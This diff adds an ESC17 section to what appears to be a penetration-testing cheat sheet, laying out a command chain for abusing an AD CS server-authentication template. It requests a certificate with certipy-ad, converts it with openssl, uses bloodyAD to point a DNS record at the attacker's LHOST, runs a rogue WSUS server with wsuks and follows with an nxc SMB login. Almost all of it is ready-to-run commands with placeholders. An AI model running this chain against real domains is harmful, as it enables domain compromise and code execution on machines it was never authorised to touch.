@@ -5253,6 +5253,50 @@ certipy-ad req -u '<USERNAME>' -p '<PASSWORD>' -dc-ip <RHOST> -ca '<CA>' -templa
 certipy-ad auth -pfx 'Administrator.pfx' -dc-ip <RHOST>
 ```
 
+### ESC17: Server Authentication Template Abuse
+
+```shell
+certipy-ad find -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -dc-ip <RHOST> -vulnerable -stdout
+```
+
+or
+
+```shell
+Invoke-Locksmith -Scan ESC17
+```
+
+```shell
+wsuks -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' --dc-ip <RHOST> --only-discover
+```
+
+```shell
+certipy-ad req -dc-ip <RHOST> -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -template '<TEMPLATE>' -target '<CA>' -ca '<CA>' -dns <RHOST>
+```
+
+```shell
+openssl pkcs12 -in <FILE>.pfx -out <FILE>.pem -nodes --passin pass:
+```
+
+```shell
+bloodyAD -d <DOMAIN> -u '<USERNAME>' -p '<PASSWORD>' --host <HOSTNAME> --dc-ip <RHOST> add dnsRecord <RHOST> <LHOST>
+```
+
+```shell
+bloodyAD -d <DOMAIN> -u '<USERNAME>' -p '<PASSWORD>' --host <RHOST> --dc-ip <RHOST> get dnsDump | grep <RHOST>
+```
+
+```shell
+nslookup <RHOST> <RHOST>
+```
+
+```shell
+sudo wsuks -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' --dc-ip <RHOST> -t <RHOST> --WSUS-Server <RHOST> --tls-cert <FILE>.pem
+```
+
+```shell
+nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth
+```
+
 ##### Error Handling
 
 ###### Fixing Username or domain is not specified, and identity information was not found in the certificate Error
